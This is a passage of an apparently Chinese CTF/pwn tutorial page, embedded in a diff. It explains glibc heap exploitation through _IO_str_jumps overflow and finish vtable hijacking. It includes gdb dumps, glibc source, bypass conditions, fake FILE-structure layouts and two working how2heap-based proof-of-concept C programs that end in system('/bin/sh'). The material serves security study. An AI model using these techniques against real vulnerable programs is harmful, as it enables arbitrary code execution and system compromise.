+0x7ffff7dd1920 &lt;_IO_2_1_stdin_+64&gt;: 0x00007ffff7dd27c0  0x0000000000000000 &lt;== _IO_buf_end
+0x7ffff7dd1930 &lt;_IO_2_1_stdin_+80&gt;: 0x0000000000000000  0x0000000000000000
+0x7ffff7dd1940 &lt;_IO_2_1_stdin_+96&gt;: 0x0000000000000000  0x0000000000000000
+0x7ffff7dd1950 &lt;_IO_2_1_stdin_+112&gt;:    0x0000000000000000  0xffffffffffffffff
+0x7ffff7dd1960 &lt;_IO_2_1_stdin_+128&gt;:    0x0000000000000000  0x00007ffff7dd3790
+0x7ffff7dd1970 &lt;_IO_2_1_stdin_+144&gt;:    0xffffffffffffffff  0x0000000000000000
+0x7ffff7dd1980 &lt;_IO_2_1_stdin_+160&gt;:    0x00007ffff7dd19c0  0x0000000000000000
+0x7ffff7dd1990 &lt;_IO_2_1_stdin_+176&gt;:    0x0000000000000000  0x0000000000000000
+0x7ffff7dd19a0 &lt;_IO_2_1_stdin_+192&gt;:    0x00000000ffffffff  0x0000000000000000
+0x7ffff7dd19b0 &lt;_IO_2_1_stdin_+208&gt;:    0x0000000000000000  0x00007ffff7dd06e0
+</code></pre></div>
+<p>之后 scanf 的读入数据就会写入到 0x7ffff7dd2740 的位置</p>
+<div class="highlight"><pre><span></span><code>0x7ffff7dd2740 &lt;buf&gt;:   0x00000a6161616161  0x0000000000000000
+0x7ffff7dd2750 &lt;buffer&gt;:    0x0000000000000000  0x0000000000000000
+0x7ffff7dd2760 &lt;buffer&gt;:    0x0000000000000000  0x0000000000000000
+0x7ffff7dd2770 &lt;buffer&gt;:    0x0000000000000000  0x0000000000000000
+0x7ffff7dd2780 &lt;buffer&gt;:    0x0000000000000000  0x0000000000000000
+</code></pre></div>
+<h3 id="_io_str_jumps-overflow">_IO_str_jumps -&gt; overflow<a class="headerlink" href="#_io_str_jumps-overflow" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>加入的是 check 是针对 <code>_IO_FILE_plus</code> 的 vtable 检查，没有对 <code>_IO_str_jumps</code> vtable 进行检查。劫持这个后者的 vtable ，找调用这个虚函数的函数运行 getshell </p>
+</blockquote>
+<p><code>libc</code>中不仅仅只有<code>_IO_file_jumps</code>这么一个<code>vtable</code>，还有一个叫<code>_IO_str_jumps</code>的 ，这个 <code>vtable</code> 不在 check 范围之内。</p>
+<div class="highlight"><pre><span></span><code>const struct _IO_jump_t _IO_str_jumps libio_vtable =
+{
+  JUMP_INIT_DUMMY,
+  JUMP_INIT(finish, _IO_str_finish),
+  JUMP_INIT(overflow, _IO_str_overflow),
+  JUMP_INIT(underflow, _IO_str_underflow),
+  JUMP_INIT(uflow, _IO_default_uflow),
+  JUMP_INIT(pbackfail, _IO_str_pbackfail),
+  JUMP_INIT(xsputn, _IO_default_xsputn),
+  JUMP_INIT(xsgetn, _IO_default_xsgetn),
+  JUMP_INIT(seekoff, _IO_str_seekoff),
+  JUMP_INIT(seekpos, _IO_default_seekpos),
+  JUMP_INIT(setbuf, _IO_default_setbuf),
+  JUMP_INIT(sync, _IO_default_sync),
+  JUMP_INIT(doallocate, _IO_default_doallocate),
+  JUMP_INIT(read, _IO_default_read),
+  JUMP_INIT(write, _IO_default_write),
+  JUMP_INIT(seek, _IO_default_seek),
+  JUMP_INIT(close, _IO_default_close),
+  JUMP_INIT(stat, _IO_default_stat),
+  JUMP_INIT(showmanyc, _IO_default_showmanyc),
+  JUMP_INIT(imbue, _IO_default_imbue)
+};
+</code></pre></div>
+<p>如果我们能设置文件指针的 <code>vtable</code> 为 <code>_IO_str_jumps</code> 么就能调用不一样的文件操作函数。这里以<code>_IO_str_overflow</code>为例子：</p>
+<div class="highlight"><pre><span></span><code><span class="kt">int</span>
+<span class="nf">_IO_str_overflow</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">int</span> <span class="n">c</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">flush_only</span> <span class="o">=</span> <span class="n">c</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">;</span>
+  <span class="n">_IO_size_t</span> <span class="n">pos</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_NO_WRITES</span><span class="p">)</span><span class="c1">// pass</span>
+      <span class="k">return</span> <span class="n">flush_only</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="n">EOF</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_TIED_PUT_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_CURRENTLY_PUTTING</span><span class="p">))</span>
+    <span class="p">{</span>
+      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_CURRENTLY_PUTTING</span><span class="p">;</span>
+      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
+      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="n">pos</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">pos</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="n">_IO_size_t</span><span class="p">)</span> <span class="p">(</span><span class="n">_IO_blen</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">+</span> <span class="n">flush_only</span><span class="p">))</span><span class="c1">// should in </span>
+    <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_USER_BUF</span><span class="p">)</span> <span class="cm">/* not allowed to enlarge */</span> <span class="c1">// pass</span>
+    <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
+      <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="kt">char</span> <span class="o">*</span><span class="n">new_buf</span><span class="p">;</span>
+      <span class="kt">char</span> <span class="o">*</span><span class="n">old_buf</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
+      <span class="kt">size_t</span> <span class="n">old_blen</span> <span class="o">=</span> <span class="n">_IO_blen</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+      <span class="n">_IO_size_t</span> <span class="n">new_size</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">old_blen</span> <span class="o">+</span> <span class="mi">100</span><span class="p">;</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">new_size</span> <span class="o">&lt;</span> <span class="n">old_blen</span><span class="p">)</span><span class="c1">//pass 一般会通过</span>
+        <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
+      <span class="n">new_buf</span>
+        <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">_IO_strfile</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">_s</span><span class="p">.</span><span class="n">_allocate_buffer</span><span class="p">)</span> <span class="p">(</span><span class="n">new_size</span><span class="p">);</span><span class="c1">//target [fp+0xe0]</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">new_buf</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+        <span class="p">{</span>
+          <span class="cm">/*      __ferror(fp) = 1; */</span>
+          <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
+        <span class="p">}</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">old_buf</span><span class="p">)</span>
+        <span class="p">{</span>
+          <span class="n">memcpy</span> <span class="p">(</span><span class="n">new_buf</span><span class="p">,</span> <span class="n">old_buf</span><span class="p">,</span> <span class="n">old_blen</span><span class="p">);</span>
+          <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">_IO_strfile</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">_s</span><span class="p">.</span><span class="n">_free_buffer</span><span class="p">)</span> <span class="p">(</span><span class="n">old_buf</span><span class="p">);</span>
+          <span class="cm">/* Make sure _IO_setb won&#39;t try to delete _IO_buf_base. */</span>
+          <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+        <span class="p">}</span>
+      <span class="n">memset</span> <span class="p">(</span><span class="n">new_buf</span> <span class="o">+</span> <span class="n">old_blen</span><span class="p">,</span> <span class="sc">&#39;\0&#39;</span><span class="p">,</span> <span class="n">new_size</span> <span class="o">-</span> <span class="n">old_blen</span><span class="p">);</span>
+
+      <span class="n">_IO_setb</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">new_buf</span><span class="p">,</span> <span class="n">new_buf</span> <span class="o">+</span> <span class="n">new_size</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="n">new_buf</span> <span class="o">+</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">-</span> <span class="n">old_buf</span><span class="p">);</span>
+      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">new_buf</span> <span class="o">+</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">-</span> <span class="n">old_buf</span><span class="p">);</span>
+      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="n">new_buf</span> <span class="o">+</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">-</span> <span class="n">old_buf</span><span class="p">);</span>
+      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">new_buf</span> <span class="o">+</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">-</span> <span class="n">old_buf</span><span class="p">);</span>
+
+      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="n">new_buf</span><span class="p">;</span>
+      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="p">}</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">flush_only</span><span class="p">)</span>
+    <span class="o">*</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span> <span class="n">c</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">)</span>
+    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">;</span>
+  <span class="k">return</span> <span class="n">c</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="n">libc_hidden_def</span> <span class="p">(</span><span class="n">_IO_str_overflow</span><span class="p">)</span>
+</code></pre></div>
+<p>利用以下代码来劫持程序流程</p>
+<div class="highlight"><pre><span></span><code>      <span class="n">new_buf</span>
+        <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">_IO_strfile</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">_s</span><span class="p">.</span><span class="n">_allocate_buffer</span><span class="p">)</span> <span class="p">(</span><span class="n">new_size</span><span class="p">);</span>
+</code></pre></div>
+<p>几个条件 bypass：</p>
+<ol>
+<li><code>1. fp-&gt;_flags &amp; _IO_NO_WRITES为假</code></li>
+<li><code>2. (pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) &gt;= ((fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + flush_only(1))</code></li>
+<li><code>3. fp-&gt;_flags &amp; _IO_USER_BUF(0x01)为假</code></li>
+<li><code>4. 2*(fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100 不能为负数</code></li>
+<li><code>5. new_size = 2 * (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100; 应当指向/bin/sh字符串对应的地址</code></li>
+<li><code>6. fp+0xe0指向system地址</code></li>
+</ol>
+<p>构造：</p>
+<div class="highlight"><pre><span></span><code>_flags = 0
+_IO_write_base = 0
+_IO_write_ptr = (binsh_in_libc_addr -100) / 2 +1
+_IO_buf_end = (binsh_in_libc_addr -100) / 2 
+
+_freeres_list = 0x2
+_freeres_buf = 0x3
+_mode = -1
+
+vtable = _IO_str_jumps - 0x18
+</code></pre></div>
+<h4 id="_4">示例<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h4>
+<p>修改了 how2heap 的 houseoforange 代码，可以自己动手调试一下。</p>
+<div class="highlight"><pre><span></span><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+int winner ( char *ptr);
+int main()
+{
+    char *p1, *p2;
+    size_t io_list_all, *top;
+    // unsorted bin attack
+    p1 = malloc(0x400-16);
+    top = (size_t *) ( (char *) p1 + 0x400 - 16);
+    top[1] = 0xc01;
+    p2 = malloc(0x1000);
+    io_list_all = top[2] + 0x9a8;
+    top[3] = io_list_all - 0x10;
+    // _IO_str_overflow conditions
+    char binsh_in_libc[] = &quot;/bin/sh\x00&quot;; // we can found &quot;/bin/sh&quot; in libc, here i create it in stack
+    // top[0] = ~1;
+    // top[0] &amp;= ~8;
+    top[0] = 0;
+    top[4] = 0; // write_base
+    top[5] = ((size_t)&amp;binsh_in_libc-100)/2 + 1; // write_ptr
+    top[7] = 0; // buf_base
+    top[8] = top[5] - 1; // buf_end
+    // house_of_orange conditions
+    top[1] = 0x61;
+
+    top[20] = (size_t) &amp;top[18];
+    top[21] = 2;
+    top[22] = 3;
+    top[24] = -1;
+    top[27] = (size_t)stdin - 0x3868-0x18; // _IO_str_jumps地址
+    top[28] = (size_t) &amp;winner;
+
+    /* Finally, trigger the whole chain by calling malloc */
+    malloc(10);
+    return 0;
+}
+int winner(char *ptr)
+{ 
+    system(ptr);
+    return 0;
+}
+</code></pre></div>
+<h3 id="_io_str_jumps-finish">_IO_str_jumps -&gt; finish<a class="headerlink" href="#_io_str_jumps-finish" title="Permanent link">&para;</a></h3>
+<p>原理与上面的 _IO_str_jumps -&gt; overflow 类似</p>
+<div class="highlight"><pre><span></span><code>void
+_IO_str_finish (_IO_FILE *fp, int dummy)
+{
+  if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))
+    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  //[fp+0xe8]
+  fp-&gt;_IO_buf_base = NULL;
+
+  _IO_default_finish (fp, 0);
+}
+</code></pre></div>
+<p>条件：</p>
+<ol>
+<li>_IO_buf_base 不为空</li>
+<li>_flags &amp; _IO_USER_BUF(0x01) 为假</li>
+</ol>
+<p>构造如下：</p>
+<div class="highlight"><pre><span></span><code>_flags = (binsh_in_libc + 0x10) &amp; ~1
+_IO_buf_base = binsh_addr
+
+_freeres_list = 0x2
+_freeres_buf = 0x3
+_mode = -1
+vtable = _IO_str_finish - 0x18
+fp+0xe8 -&gt; system_addr
+</code></pre></div>
+<h4 id="_5">示例<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h4>
+<p>修改了 how2heap 的 houseoforange 代码，可以自己动手调试一下。</p>
+<div class="highlight"><pre><span></span><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+int winner ( char *ptr);
+int main()
+{
+    char *p1, *p2;
+    size_t io_list_all, *top;
+    // unsorted bin attack
+    p1 = malloc(0x400-16);
+    top = (size_t *) ( (char *) p1 + 0x400 - 16);
+    top[1] = 0xc01;
+    p2 = malloc(0x1000);
+    io_list_all = top[2] + 0x9a8;
+    top[3] = io_list_all - 0x10;
+    // _IO_str_finish conditions
+    char binsh_in_libc[] = &quot;/bin/sh\x00&quot;; // we can found &quot;/bin/sh&quot; in libc, here i create it in stack
+
+    top[0] = ((size_t) &amp;binsh_in_libc + 0x10) &amp; ~1;
+    top[7] = ((size_t)&amp;binsh_in_libc); // buf_base
+
+    // house_of_orange conditions
+    top[1] = 0x61;
+    top[5] = 0x1 ; //_IO_write_ptr
+    top[20] = (size_t) &amp;top[18];
+    top[21] = 2;
+    top[22] = 3;
+    top[24] = -1;
+    top[27] = (size_t) stdin - 0x33f0 - 0x18;
+    top[29] = (size_t) &amp;winner;
+        top[30] = (size_t) &amp;top[30];
+    malloc(10);
+    return 0;
+}
+int winner(char *ptr)
+{ 
+    system(ptr);
+    return 0;
+}
+</code></pre></div>
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            <span>&copy; 2021</span>by <a href="https://www.mrskye.cn/" target="_blank">SkYe231</a> &nbsp;|&nbsp; <span><a href="http://beian.miit.gov.cn/" target="_blank">粤ICP备20056619号</a></span>
+          </div>
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../../assets/javascripts/vendor.93c04032.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.83e5331e.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
+      
+      <script>
+        app = initialize({
+          base: "../../..",
+          features: {'tabs': True},
+          search: Object.assign({
+            worker: "../../../assets/javascripts/worker/search.8c7e0a7e.min.js"
+          }, typeof search !== "undefined" && search)
+        })
+      </script>
+      
+    
+  </body>
+</html>
